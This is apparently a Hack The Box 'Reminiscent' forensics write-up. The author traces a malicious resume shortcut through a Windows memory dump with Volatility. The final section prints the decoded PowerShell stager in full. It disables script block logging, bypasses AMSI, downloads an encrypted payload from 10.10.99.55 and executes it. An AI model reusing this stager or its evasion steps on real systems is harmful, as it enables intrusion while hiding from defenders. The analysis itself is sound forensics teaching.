# [Reminiscent](https://app.hackthebox.com/challenges/Reminiscent) Writeup [HTB]
_Forensics_

## Introducing the challenge
In this challenge, I have to find the malware that some [B.Loodworm](https://forum.tip.it/topic/35909-bloodworm-virus/) guy sent via email to an unfortunate employee, through a `resume.zip` file. To do so, I have access to the memory dump of the machine.

I open `volatility` and all the possible cheatsheets (listed [here](../../utilities/tools.md#forensics)), and I'm ready to go!

## Analyzing the processes
First, I list all processes that were running when the screenshot was taken:
```sh
$ volatility -f flounder-pc-memdump.elf --profile=Win7SP1x64 pstree
Volatility Foundation Volatility Framework 2.6.1
Name                                                  Pid   PPid   Thds   Hnds Time
-------------------------------------------------- ------ ------ ------ ------ ----
 0xfffffa800169bb30:csrss.exe                         348    328      9    416 2017-10-04 18:04:29 UTC+0000
 0xfffffa8001f63b30:wininit.exe                       376    328      3     77 2017-10-04 18:04:29 UTC+0000
 [...]
 0xfffffa80006b7040:System                              4      0     83    477 2017-10-04 18:04:27 UTC+0000
. 0xfffffa8001a63b30:smss.exe                         272      4      2     30 2017-10-04 18:04:27 UTC+0000
 0xfffffa80020bb630:explorer.exe                     2044   2012     36    926 2017-10-04 18:04:41 UTC+0000
. 0xfffffa80022622e0:VBoxTray.exe                    1476   2044     13    146 2017-10-04 18:04:42 UTC+0000
. 0xfffffa80007e0b30:thunderbird.ex                  2812   2044     50    534 2017-10-04 18:06:24 UTC+0000
. 0xfffffa800224e060:powershell.exe                   496   2044     12    300 2017-10-04 18:06:58 UTC+0000
.. 0xfffffa8000839060:powershell.exe                 2752    496     20    396 2017-10-04 18:07:00 UTC+0000
```
Interestingly, the only processes that were executed after Thunderbird are two Powershells, PID 496 and 2752. I decide to keep an eye on them, and proceed to look at the files.

## Listing the files
Since the `resume.zip` file is most likely responsible for all this mess, I scan the dumped files to see if I can find it somewhere.
```sh
$ volatility -f flounder-pc-memdump.elf --profile=Win7SP1x64 filescan | grep resume
Volatility Foundation Volatility Framework 2.6.1
0x000000001e1f6200      1      0 R--r-- \Device\HarddiskVolume2\Users\user\Desktop\resume.pdf.lnk
0x000000001e8feb70      1      1 R--rw- \Device\HarddiskVolume2\Users\user\Desktop\resume.pdf.lnk
```
I didn't find the zip, but I have a link to a PDF! I use `volatility` yet again to dump it.
```sh
$ volatility -f flounder-pc-memdump.elf --profile=Win7SP1x64 dumpfiles -Q 0x000000001e1f6200 --name resume -D .
Volatility Foundation Volatility Framework 2.6.1
DataSectionObject 0x1e1f6200   None   \Device\HarddiskVolume2\Users\user\Desktop\resume.pdf.lnk
SharedCacheMap 0x1e1f6200   None   \Device\HarddiskVolume2\Users\user\Desktop\resume.pdf.lnk
```
According to `file`, this is actually a Windows shortcut:
```sh
$ file file.None.0xfffffa80022ac740.resume.pdf.lnk.dat
file.None.0xfffffa80022ac740.resume.pdf.lnk.dat: MS Windows shortcut, Item id list present, Points to a file or directory, Has Relative path, Has command line arguments, Icon number=1, Archive, ctime=Mon Aug  7 14:41:42 2017, mtime=Mon Aug  7 14:41:42 2017, atime=Fri Dec  9 01:34:22 2016, length=443392, window=hide
```

## Taking the shortcut!
Immediately, I run `strings` to take a deeper look to this mysterious file.
```sh
$ strings file.None.0xfffffa80022ac740.resume.pdf.lnk.dat 
/C:\
DKfp
Windows
DKfp*
System32
WINDOW~1
v1.0
KV}*
powershell.exe
K6}*
C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
%SystemRoot%\system32\SHELL32.dll
1SPS
cABvAHcA[...]wBBAEEAPQA=
,&fbM
,&fbM
```
where `cABvAHcA[...]wBBAEEAPQA=` is a massive, almost 10 kB string, that I don't report here for the sake of simplicity.

Now, I'm no Windows expert, and I'm not sure how "MS Windows shortcuts" work. However, I'm pretty sure they don't randomly call Powershells here and there. Then, there is that huge, super suspicious string. I can smell the base 64 from here. I paste it into a decoder, and get this:
```
powershell -noP -sta -w 1 -enc JABHAHIA[...]ABJAEUAWAA=
```
where `JABHAHIA[...]ABJAEUAWAA=` is another suspiciously-base-64, 3.5 kB string. I decode it and get the malware code!
```
$GroUPPOLiCYSEttINGs = [rEF].ASseMBLY.GEtTypE('System.Management.Automation.Utils')."GEtFIE`ld"('cachedGroupPolicySettings', 'N'+'onPublic,Static').GETValUe($nulL);$GRouPPOlICySeTTiNgS['ScriptB'+'lockLogging']['EnableScriptB'+'lockLogging'] = 0;$GRouPPOLICYSEtTingS['ScriptB'+'lockLogging']['EnableScriptBlockInvocationLogging'] = 0;[Ref].AsSemBly.GeTTyPE('System.Management.Automation.AmsiUtils')|?{$_}|%{$_.GEtFieLd('amsiInitFailed','NonPublic,Static').SETVaLuE($NulL,$True)};[SysTem.NeT.SErVIcePOIntMAnAgER]::ExpEct100COnTinuE=0;$WC=NEW-OBjEcT SysTEM.NEt.WeBClIEnt;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';$wC.HeaDerS.Add('User-Agent',$u);$Wc.PRoXy=[SysTeM.NET.WebRequEst]::DefaULtWeBPROXY;$wC.PRoXY.CREDeNtIaLS = [SYSTeM.NET.CreDEnTiaLCaChe]::DeFauLTNEtwOrkCredentiAlS;$K=[SYStEM.Text.ENCODIng]::ASCII.GEtBytEs('E1gMGdfT@eoN>x9{]2F7+bsOn4/SiQrw');$R={$D,$K=$ArgS;$S=0..255;0..255|%{$J=($J+$S[$_]+$K[$_%$K.CounT])%256;$S[$_],$S[$J]=$S[$J],$S[$_]};$D|%{$I=($I+1)%256;$H=($H+$S[$I])%256;$S[$I],$S[$H]=$S[$H],$S[$I];$_-bxoR$S[($S[$I]+$S[$H])%256]}};$wc.HEAdErs.ADD("Cookie","session=MCahuQVfz0yM6VBe8fzV9t9jomo=");$ser='http://10.10.99.55:80';$t='/login/process.php';$flag='HTB{$_REDACTED_$}';$DatA=$WC.DoWNLoaDDATA($SeR+$t);$iv=$daTA[0..3];$DAta=$DaTa[4..$DAta.LenGTH];-JOIN[CHAr[]](& $R $datA ($IV+$K))|IEX
```
(Yes, the flag is here, too)

## Read more!
[➡️ Next challenge: emo](./emo.md)